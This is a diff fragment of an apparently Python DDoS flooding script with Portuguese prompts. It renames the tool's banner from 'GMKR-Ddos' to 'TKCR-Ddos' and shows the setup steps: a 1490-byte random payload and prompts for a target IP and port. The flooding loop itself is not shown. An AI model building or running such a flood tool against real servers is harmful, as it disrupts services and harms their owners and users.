@@ -18,11 +18,11 @@ bytes = random._urandom(1490)
 #############
 
 os.system("limpando")
-os.system("figlet GMKR-Ddos")
+os.system("figlet TKCR-Ddos")
 ip = raw_input("IP alvo : ")
 port = input("Port       : ")
 os.system("limpando")
-os.system("figlet GMKR-Ddos")
+os.system("figlet TKCR-Ddos")
 print ("\033[92m")
 print ("________________TENTANDO ALCANÇAR O SERVER_____________________")
 time.sleep(5)
